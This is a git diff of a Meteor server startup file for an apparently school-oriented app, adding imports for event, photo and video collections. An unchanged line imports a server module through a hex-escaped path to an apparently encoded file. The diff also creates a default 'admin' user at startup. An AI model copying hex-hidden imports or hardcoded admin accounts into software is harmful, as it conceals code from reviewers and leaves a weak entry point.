@@ -17,6 +17,11 @@ import { Faculties } from '/imports/api/collections/faculties.js'; /* for uni fa
 import { FacultyDepartments } from '/imports/api/collections/facultyDepartments.js'; /* for facultyDepartments */
 import { SchoolNews } from '/imports/api/collections/schoolNews.js';
 import { SchoolNotice } from '/imports/api/collections/schoolNotice.js';
+import { SchoolEvents } from '/imports/api/collections/schoolEvents.js';
+import { SchoolPhotos } from '/imports/api/collections/schoolPhotos.js';
+import { SchoolVideos } from '/imports/api/collections/schoolVideos.js';
+
+import { ChoosenSchools } from '/imports/api/collections/choosenSchools.js';
 
 import { Messages } from '/imports/api/collections/messages.js';
 import { MessageRooms } from '/imports/api/collections/messageRooms.js';
@@ -27,11 +32,12 @@ import '../imports/startup/server/index.js'
 
 import "\x2F\x69\x6D\x70\x6F\x72\x74\x73\x2F\x61\x70\x69\x2F\x73\x65\x72\x76\x65\x72\x2F\x5F\x5F\x65\x6E\x63\x5F\x41\x5F\x31\x36\x78\x50\x5F\x5F\x30\x31\x30\x31\x2E\x6A\x73"; /*__enc_A */
 
-//import { SchoolVideos } from '../imports/api/collections/schoolVideos.js';
-//import { SchoolImages } from '../imports/api/collections/schoolImages.js';
+// import { SchoolVideos } from '../imports/api/collections/schoolVideos.js';
+// import { SchoolImages } from '../imports/api/collections/schoolImages.js';
 
 
 Meteor.startup(() => {
+
 
   // WebApp.connectHandlers.use('/api/nameGet', (req, res) => {
   //   const name = Meteor.users.findOne({"_id" : req.query.userId}, {
@@ -96,7 +102,8 @@ Meteor.startup(() => {
     }
   }
 
-  adminControl = Meteor.users.findOne({"username" : "admin"})
+  adminControl = Meteor.users.findOne({"username" : "admin"});
+
   if(!adminControl){
     Accounts.createUser({
       username : "admin",
